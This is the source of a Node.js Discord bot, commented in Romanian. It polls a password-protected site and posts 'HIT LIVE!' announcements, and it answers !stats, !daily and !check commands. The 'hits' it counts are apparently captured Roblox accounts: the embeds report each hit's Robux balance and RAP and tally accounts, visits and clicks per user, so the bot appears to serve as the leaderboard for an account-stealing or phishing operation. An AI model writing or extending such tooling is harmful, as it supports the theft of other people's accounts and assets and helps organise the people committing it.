// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

// 4️⃣ Environment variables
const TOKEN = process.env.DISCORD_BOT_TOKEN;
const ANNOUNCE_CHANNEL_ID = process.env.ANNOUNCE_CHANNEL_ID;
const SITE_URL = process.env.SITE_URL;
const SITE_USERNAME = process.env.SITE_USERNAME;
const SITE_PASSWORD = process.env.SITE_PASSWORD;
const INJURIES_API = process.env.INJURIES_API;
const POLL_INTERVAL_MS = process.env.POLL_INTERVAL_MS || 30000;

// 5️⃣ Funcții utile
function formatNumber(num) {
  try { return num.toLocaleString(); } catch { return "0"; }
}
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// 6️⃣ Variables pentru monitorizare
let lastHitSummary = null;

// 7️⃣ Eveniment ready
client.once('ready', () => {
  console.log(`✅ Bot ready as ${client.user.tag}`);
  console.log(`📊 Serving ${client.guilds.cache.size} servers`);
  startMonitoring();
});

// 8️⃣ Monitorizare site și announce
async function startMonitoring() {
  setInterval(async () => {
    try {
      // Login / fetch site data
      const response = await fetch(SITE_URL, {
        method: 'GET',
        headers: { 'Authorization': `Basic ${Buffer.from(`${SITE_USERNAME}:${SITE_PASSWORD}`).toString('base64')}` }
      });
      const data = await response.json(); // presupunem că site-ul returnează JSON cu "hits" sau "summary"
      
      const currentSummary = data.summary || 0;

      if (lastHitSummary !== null && currentSummary > lastHitSummary) {
        // A apărut un hit nou
        const hitDelta = currentSummary - lastHitSummary;
        const userId = data.lastHitUserId; // dacă site-ul dă userId
        const userStatsRes = await fetch(`${INJURIES_API}&userId=${userId}`);
        const userStats = await userStatsRes.json();

        const embed = new EmbedBuilder()
          .setColor(0xFFFF00)
          .setTitle(`<a:Black_hear:1435093893061541920> HIT LIVE!`)
          .setDescription(`
<a:blackverified:1435093657010176071> **User:** ${userStats.Profile?.userName || "Unknown"}
<a:blackverified:1435093657010176071> **Summary gained:** ${hitDelta}
<a:blackverified:1435093657010176071> **Robux:** ${userStats.Normal?.Highest?.Balance || 0}
<a:blackverified:1435093657010176071> **RAP:** ${userStats.Normal?.Highest?.Rap || 0}
`)
          .setImage("https://cdn.discordapp.com/attachments/1436416072252260362/1436418034352001124/standard-3.gif")
          .setFooter({ text: "Live hits monitor" });

        const announceChannel = client.channels.cache.get(ANNOUNCE_CHANNEL_ID);
        if (announceChannel) announceChannel.send({ embeds: [embed] });
      }

      lastHitSummary = currentSummary;

    } catch (err) {
      console.error("Error monitoring site:", err);
    }
  }, POLL_INTERVAL_MS);
}

// 9️⃣ Comenzi Discord
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`${INJURIES_API}&userId=${targetId}`);
      const data = await res.json();
      if (!data.success || !data.Normal) return message.reply("❌ No stats found for this user.");

      const normal = data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`─── **NORMAL INFO** ───
**User:** ${userName}
**TOTAL STATS:**
Hits: ${formatNumber(normal.Totals?.Accounts)}
Visits: ${formatNumber(normal.Totals?.Visits)}
Clicks: ${formatNumber(normal.Totals?.Clicks)}
**BIGGEST HIT:**
Summary: ${formatNumber(normal.Highest?.Summary)}
RAP: ${formatNumber(normal.Highest?.Rap)}
Robux: ${formatNumber(normal.Highest?.Balance)}
`)
        .setFooter({ text: "Stats Bot" });

      message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error(err);
      message.reply("❌ Error fetching stats.");
    }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`${INJURIES_API}&userId=${targetId}`);
      const data = await res.json();
      if (!data.success) return message.reply("❌ No daily stats found.");

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`─── **DAILY STATS** ───
**User:** ${userName}
Hits: ${formatNumber(daily.Totals?.Accounts)}
Visits: ${formatNumber(daily.Totals?.Visits)}
Clicks: ${formatNumber(daily.Totals?.Clicks)}
`)
        .setFooter({ text: "Stats Bot Daily" });

      message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error(err);
      message.reply("❌ Error fetching daily stats.");
    }
  }

  // ===== !check =====
  if (message.content.startsWith('!check')) {
    try {
      const response = await fetch(SITE_URL, {
        method: 'GET',
        headers: { 'Authorization': `Basic ${Buffer.from(`${SITE_USERNAME}:${SITE_PASSWORD}`).toString('base64')}` }
      });
      const data = await response.json();
      const status = data.summary ? "ONLINE" : "OFFLINE";

      const embed = new EmbedBuilder()
        .setColor(status === "ONLINE" ? 0x00FF00 : 0xFF0000)
        .setDescription(`**SITE STATUS:** ${status}`)
        .setImage("https://cdn.discordapp.com/attachments/1436416072252260362/1436418034352001124/standard-3.gif")
        .setFooter({ text: "Site Monitor" });

      message.channel.send({ embeds: [embed] });
    } catch {
      message.channel.send("❌ Site unreachable.");
    }
  }
});

// 10️⃣ Error handler
client.on('error', error => console.error('Discord client error:', error));

// 11️⃣ Login bot
if (!TOKEN) {
  console.error("❌ DISCORD_BOT_TOKEN not set!");
  process.exit(1);
}
client.login(TOKEN);
